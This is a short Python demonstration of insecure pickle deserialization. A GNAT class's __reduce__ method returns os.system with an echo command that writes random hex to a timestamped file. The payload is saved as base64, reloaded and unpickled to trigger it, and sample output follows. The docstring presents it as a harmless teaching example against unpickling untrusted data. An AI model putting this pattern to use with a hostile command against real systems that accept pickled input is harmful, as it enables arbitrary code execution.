"""
Harmless version of the GNAT class that, when deserialized, writes a randomly named file containing random hex data.

🔍 What This Does
Creates a file named like: random_name_2025_06_12_0930_00.txt
Fills it with 64 hex characters (e.g., 9fa3b7e1d2...)
Uses os.system() to run a simple echo ... > file command

✅ Security Reminder
This is still code execution, even if harmless. Always treat pickle files like executable code. This version is safe for demo use, but it still illustrates why you must not unpickle untrusted data.
"""

import pickle, os, base64, random, datetime

class GNAT:
    def __reduce__(self):
        now = datetime.datetime.now()
        filename = f"random_name_{now.strftime('%Y_%m_%d_%H%M_%S')}.txt"
        hex_data = ''.join(random.choices('0123456789abcdef', k=64))
        command = f'echo {hex_data} > {filename}'
        return (os.system, (command,))

# Serialize
serialized_obj = pickle.dumps(GNAT())
serialized_obj_b64 = base64.b64encode(serialized_obj)

print(f'serialized object: {serialized_obj_b64}')

# Save to file
with open("payload.b64", "wb") as f:
    f.write(serialized_obj_b64)

print("Pickle payload written to payload.b64")

# Delete the object and simulate separate execution
del serialized_obj 
del serialized_obj_b64

# STEP 2: Read back and execute
with open("payload.b64", "rb") as f:
    serialized_obj_b64 = f.read()
    serialized = base64.b64decode(serialized_obj_b64)

# This will execute the payload: write a file with hex content
# For demonstration: Unpickle it to trigger the harmless file creation
pickle.loads(serialized)  # This will write the file when run

"""
serialized object: b'gASVhQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjGplY2hvIGVhNzVjMTk3NTY3YWVjNWE2N2Q4ZTYyYjU2N2M4ZjlmZjQ5MmM3MmJlMzI0M2ZmOTQ4OWY1NTMyYzFlMDQxYjEgPiByYW5kb21fbmFtZV8yMDI1XzA2XzEyXzE5MDZfMjgudHh0lIWUUpQu'
Pickle payload written to payload.b64
0
"""